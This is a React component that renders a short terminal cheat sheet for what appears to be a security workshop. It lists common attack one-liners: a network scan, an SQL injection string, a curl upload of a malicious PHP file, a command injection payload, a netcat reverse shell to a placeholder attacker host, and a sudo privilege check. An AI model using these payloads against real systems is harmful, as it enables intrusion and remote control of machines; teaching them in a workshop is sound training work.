import React from 'react';

const TerminalGuide: React.FC = () => {
    return (
        <div className="terminal-guide">
            <h2>Terminal Command Guide</h2>
            <p>Welcome to the Terminal Command Guide for the workshop. Below are some commands you can use:</p>
            <ul>
                <li><strong>Reconnaissance:</strong> <code>nmap -sP 192.168.1.0/24</code> - Scan the network for active devices.</li>
                <li><strong>SQL Injection:</strong> <code>' OR '1'='1</code> - Common payload for SQL injection.</li>
                <li><strong>File Upload RCE:</strong> <code>curl -F "file=@malicious.php" http://yourserver/upload</code> - Upload a malicious file.</li>
                <li><strong>Command Injection:</strong> <code>; ls -la</code> - Example of command injection payload.</li>
                <li><strong>Reverse Shell:</strong> <code>nc -e /bin/bash attacker_ip attacker_port</code> - Establish a reverse shell.</li>
                <li><strong>Privilege Escalation:</strong> <code>sudo -l</code> - List allowed sudo commands.</li>
            </ul>
            <p>Make sure to replace <code>attacker_ip</code> and <code>attacker_port</code> with your actual IP and port.</p>
            <p>Good luck!</p>
        </div>
    );
};

export default TerminalGuide;